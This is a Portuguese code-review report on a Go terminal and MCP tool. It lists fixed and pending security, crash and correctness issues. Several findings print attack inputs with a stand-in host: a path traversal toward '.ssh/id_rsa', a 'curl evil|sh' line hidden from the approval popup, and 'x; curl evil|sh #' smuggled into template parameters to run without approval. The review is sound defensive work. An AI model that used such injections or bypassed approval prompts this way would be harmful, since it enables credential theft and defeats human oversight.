# Revisão de código — 2026-11-01

Revisão do código inteiro (fora `third_party/`), com foco em segurança, correção e "slop". Nada
foi commitado: tudo está no working tree, `make check` passa.

## Método

1. **Ferramentas estáticas**: `gofmt`, `go vet`, `staticcheck` (1 aviso, já marcado de propósito:
   `cmd/noct/scripts.go:58`) e `govulncheck` (0 vulnerabilidades alcançáveis; 1 no
   `golang.org/x/sys` v0.41.0, só Windows, não chamada).
2. **Revisores em paralelo**, cada um com uma área e só leitura: daemon/IPC/MCP; fluxos, scripts,
   templates e agendador; update/config/logstore/tema/kittygfx/layout/pane; núcleo do `app`;
   painéis e popups do `app`; CLI, Makefile e workflow de release. Cada achado precisava de
   arquivo:linha, cenário concreto de falha e correção mínima, conferidos lendo os chamadores.
3. **Triagem**: cada achado foi conferido no código antes de mexer. Os que mudam uma decisão de
   design ficaram em [Pendentes](#pendentes), com a recomendação.
4. **Teste que falha sem a correção** para cada bug corrigido (CONTRIBUTING §1). Os de pane e
   mouse foram confirmados revertendo a correção: sem ela o teste falha ou trava.
5. **Segunda revisão**: um revisor independente leu o diff final procurando regressões. Ele achou
   três, já corrigidas: o deadline de envio valia também no CLI e quebrava o framing no meio de
   uma mensagem; a fila da pane perdia digitação com só 256 chunks; o resumo não escapava
   caracteres bidi.

## O que mudou

### Segurança

| Onde | Problema | Correção | Teste |
|---|---|---|---|
| `internal/mcp/run_tools.go` `logLines` | `read_log` (política `allow`) checava só `HasPrefix(path, LogsDir())`: `<logs>/../../.ssh/id_rsa` e `<logs>-x/…` passavam, e a IA lia qualquer arquivo do usuário | `filepath.Rel` sobre o caminho limpo; recusa o que sai da pasta | `TestLogLinesRefusesPathsOutsideTheLogs` |
| `internal/mcp/tools.go` `argText` | O popup de aprovação corta o resumo na altura do painel; `run_command{"ls\n…\ncurl evil\|sh"}` mostrava só `ls` | Valor com caractere de controle ou de formato (Cc/Cf, como U+202E) aparece entre aspas numa linha só (`strconv.Quote`) | `TestSummaryShowsHiddenLinesOnOneLine` |
| `internal/ipc/ipc.go` `Listen` | Sem `XDG_RUNTIME_DIR`, `/tmp/noct-<uid>` criado antes por outro usuário era aceito: ele podia trocar o socket e ler o que se digita | `checkPrivateDir`: a pasta tem de ser diretório real, do usuário, sem permissão para outros | `TestListenRefusesASocketDirectoryOthersCanWrite` |
| `internal/ipc/ipc.go` `Listen` | Dois daemons iniciados juntos (ex.: `noct mcp` e `noct`) passavam ambos no dial; o segundo apagava o socket do primeiro, que ficava órfão com triggers duplicados | `flock` em `noct.lock` durante o check e enquanto escuta (`lockedListener`) | `TestListenRefusesWhileAnotherDaemonHoldsTheLock` |
| `internal/script/version.go` via `scripts_panel.go` e `cmd/noct/scripts.go` | Abrir o painel de scripts (ou `noct ls`) dentro de um repo clonado rodava o `version_cmd`/`program` do `.noct/scripts` dele | Scripts da pasta `project` não têm versão detectada | `TestProjectScriptsDoNotRunTheirVersionCommand` |
| `internal/kittygfx/session.go` | `s=2^62` fazia o divisor de `ceilDiv` estourar para 0: panic derrubava o daemon inteiro. `c`/`r` sem limite antes da conta | `s`/`v` limitados a 65536, `c`/`r` a `MaxPlacementCells` antes das contas | `TestHugeStatedSizesDoNotOverflow` |
| `internal/kittygfx/session.go` | Upload em chunks `m=1` sem limite: memória sem fim | Limite de 64 MiB, responde `EFBIG` | `TestOversizedChunkedUploadIsDropped` |
| `internal/kittygfx/session.go` | `t=f` com caminho de FIFO travava o leitor da pane | `O_NONBLOCK` e só arquivo regular (`fileImageSize`) | — |
| `internal/update/install.go` `ManualCommand` | Comando com `sudo` extraía em `/tmp/noct`, caminho previsível | `dir=$(mktemp -d)` | `TestManualCommand`, `TestUpdatePrintsTheCommandForAFolderItCannotWrite` |
| `internal/update/install.go` | `LimitReader` cortava calado um binário > 64 MiB e instalava o pedaço | Recusa pelo `header.Size` | — |
| `.github/workflows/release.yml` | Actions por tag mutável num job com `contents: write`; Go travado em 1.24.2 (CVEs corrigidas depois em `net/http`, `crypto/x509`, `archive/tar`) | Actions fixadas por SHA, `persist-credentials: false`, `go-version: stable` | — |

### Travamentos e crashes

| Onde | Problema | Correção | Teste |
|---|---|---|---|
| `internal/pane/pane.go` `queueScreenInput` | Programa que não lê stdin e pede `\e[6n` sem parar: a resposta do emulador bloqueava com `screenLock` preso e a UI toda congelava | Fila de 256 para 4096 chunks (cola longa e digitação adiantada cabem); cheia, descarta em vez de bloquear | `TestUnreadRepliesDoNotFreezeTheScreen` (trava sem a correção) |
| `internal/ipc/ipc.go` `Send` | Terminal que para de ler (ctrl+s, ssh parado) bloqueava o loop principal no `Flush`: daemon parado para todos | `Conn.LimitSends`: só nas conexões aceitas pelo daemon, deadline de 10 s por pedaço de 64 KiB (link lento que progride não cai); falhou, fecha a conexão, pois o framing quebrou. O lado do CLI fica sem limite | `TestSendGivesUpOnAPeerThatStopsReading` |
| `internal/app/mouse.go` `handleWheel` | Roda do mouse com seleção arrastando de pane fechada ou de outra tab focava pane fora de `t.views`: nil deref no desenho | Descarta a seleção | `TestWheelAfterTheSelectedTabChangesDropsTheSelection` (falha sem a correção) |
| `internal/app/mouse.go` `dragDivider` | Tab esvaziada durante o arraste: `tree` nil | Checa `isEmpty` | — |
| `internal/app/selection.go` `lines` | `rows <= 0` (run view mínima com rodapé): laço infinito ou buffer de altura negativa | Retorna nada | — |
| `internal/app/scripts.go` `startRun` | Falha ao iniciar na home: `currentTab()` nil | Checa a tab | — |
| `internal/app/pane_request.go` | Pane pedido por fluxo numa tab vazia que não inicia: erro engolido, fluxo com `wait` esperava para sempre | `openFirstPane` devolve o erro e a resposta leva o motivo | `TestPaneRequestThatCannotStartAnswersWithTheError` |
| `internal/flow/edit.go` `SplitPath` | `0/then` dava `rest[:-1]`: panic no CLI (`--steps`) e no MCP `flow_scope` | Índice -1 (nenhum passo) | em `TestEditingByPath` |
| `internal/app/app.go` `shutdown` | Fechava só as panes da sessão atual | `closeViews` de todas as sessões | — |

### Correção

| Onde | Problema | Correção | Teste |
|---|---|---|---|
| `internal/config/config.go` `Save` | Erro de TOML fazia `Load` devolver o padrão inteiro; a próxima mudança no painel salvava por cima e perdia tudo (incluindo `deny` do MCP) | `Save` recusa sobrescrever arquivo que não lê | `TestSaveKeepsAFileThatDoesNotRead` |
| `internal/flow/validate.go` | Passo `script:` retornava antes de validar `capture` e `output_matches` | Valida os padrões depois do script | caso `script capture` em `TestValidateRejects` |
| `internal/flow/cron.go` | `5/15` virava só `5` | Passo sem faixa vai até o máximo do campo | casos em `TestCronMatches` |
| `internal/logstore/entries.go` `Path` | `step-tools/build` criava subpasta: log invisível na view e nunca podado | `/` e `\` viram `-` | `TestPathKeepsFolderNamesInTheDay` |
| `cmd/noct/mcp.go` | `mcp.log` aberto com `O_TRUNC`: cada `noct mcp` apagava a auditoria | `logstore.Append` | — |
| `internal/mcp/run_tools.go` `appendFileLines` | Linha > 4 MB parava o scanner calado | Devolve `scanner.Err()` | — |
| `internal/app/complete_path.go` `sharedStart` | Prefixo comum cortava UTF-8 no meio | Recua até início de rune | `TestSharedStartKeepsWholeCharacters` |
| `internal/app/flows.go` `editFlowStep` | Arquivo de edição com nome previsível em `/tmp` | `writeTempFile` com `os.CreateTemp` | — |
| `internal/app/triggers.go` | Fluxos de trigger recebiam `os.Environ()` com variáveis do terminal de fora | `a.shellEnv`, como os outros caminhos | — |
| `cmd/noct/scripts.go` `runCommand` | Script morto por sinal saía com 255 | `128 + sinal` | — |

### Docs

- `CHANGELOG.md` (Unreleased): Changed, Fixed e Security.
- `docs/scripts.md`: regra da versão dos scripts de projeto.
- `docs/arquitetura.md`: `noct.lock` e a exigência de pasta privada.
- `docs/decisoes.md` (ADR de updates): o novo comando manual.

## Pendentes

Não corrigidos porque mudam uma decisão de design ou pedem mais que uma correção pontual.

1. **`run` do MCP é injeção de shell (alta).** `run` é `allow`, mas os `params` da IA entram crus no
   template de `s.Command` rodado com `sh -c`. Num script com `{{.pattern}}`, o valor
   `x; curl evil|sh #` roda sem aprovação, contornando `run_command = ask`. A IA também pode passar
   params secretos ou `from: env:`. Opções: (a) `run` passa a `ask` quando há `params`;
   (b) params como variáveis de ambiente ou argumentos posicionais (`"$1"`) em vez de texto no
   template; (c) uma função `quote` nos templates, que só ajuda scripts novos.
   **Recomendação**: (a) já, com ADR em `docs/mcp.md`, e (b) como formato a longo prazo.
2. **Saídas de passos em `run:`** (`{{.steps.x.output}}`) também entram cruas no shell; o
   heredoc documentado é a única defesa. Vale a mesma função `quote` do item 1.
3. **Escritas concorrentes de `runs.json`, `results`, `triggers` e `values`**: ler, mudar e gravar
   sem trava e com `.tmp` fixo. TUI e CLI gravando juntos podem perder ou corromper o histórico.
   Um helper único (`CreateTemp` + rename + `flock`) substituiria as 7 cópias da escrita atômica.
4. **Watch triggers** percorrem a subárvore inteira a cada 2 s, mesmo para um caminho literal
   (`README.md` com `node_modules` ao lado, ou `~/notes.md` varrendo o `$HOME`). Usar `os.Stat` no
   caminho literal e `SkipDir` fora do alcance do padrão.
5. **Passos sem timeout**: um passo travado num fluxo de cron para o agendamento dele até o daemon
   reiniciar (`a.triggered`).
6. **Cron e horário de verão**: na volta do horário um minuto roda duas vezes, na ida é pulado.
   Documentar ou guardar o último minuto rodado.
7. **Chamadas MCP sem cancelamento**: o cliente de IA sai, mas `get_run` (até 600 s) e as
   aprovações continuam; uma aprovação dada depois ainda roda `run_command`.
8. **`with:` não confere os nomes de params do script**: um erro de digitação roda o script com o
   valor padrão sem aviso.
9. **`config.toml` e temas**: `Rename` por cima troca um symlink (stow/dotfiles) por arquivo comum.
10. **`kittygfx`**: `outerIDs`/`sizes` crescem por toda a vida da pane; `stream.go` copia e varre
    `pending` de novo a cada leitura (quadrático até 32 MiB).
11. **Logs no mesmo segundo**: dois passos `pane: new` com o mesmo nome no mesmo segundo
    truncam e dividem um arquivo (`O_TRUNC`). Abrir com `O_EXCL` e sufixo `-2`.
12. **`Makefile`**: comentários e mensagens em português (o AGENTS.md pede inglês); `$(VERSION)`
    sem validação nas receitas (só quem empurra tags explora).
13. `golang.org/x/sys` v0.41.0 → v0.44.0 (GO-2026-5024, só Windows, não alcançável). Atualizar
    uma dependência que já existe não pede ADR (só uma nova pede).

## Anti-slop encontrado (não mexido)

- Atômico `tmp + rename` escrito à mão 7 vezes (`flow.Save`, `SaveResultTo`, `SetEnabled`,
  `Memory.save`, `writeRuns`, `config.Save`, `theme`), além de `update.replaceFile`.
- Regex `validName` copiada 4 vezes (`script`, `flow`, `templates`, `mcp`) e `identifier` 2 vezes.
- `flow/warnings.go` `walkFields` duplica `script.fieldsUsed`; `Step.templates()` e
  `orderedTemplates()` listam os mesmos textos.
- `app/tab.go` `newTab` e `app/setup.go` `themeNames` só têm chamadores em teste.
- `app/mcp_panel.go`: a goroutine de "receber até fechar" aparece duas vezes.
- `app/config_panel.go`: `changeSetting` (~90 linhas, ~30 casos) e `configLines` (~83) passam do
  limite de complexidade do CONTRIBUTING.
- `logs_panel.go` e `scripts_panel.go` tratam `end`/setas à mão ao lado de `listJump`.
- `config.LogColumns` e `DefaultLogColumns` são a mesma lista literal.
- `cmd/noct/main.go`: `usage` e `help` repetem a lista de comandos e nenhum cita o alias `run`.
- `cmd/noct/main_test.go:324`: checagem negativa depois de `time.Sleep(500ms)` fixo.
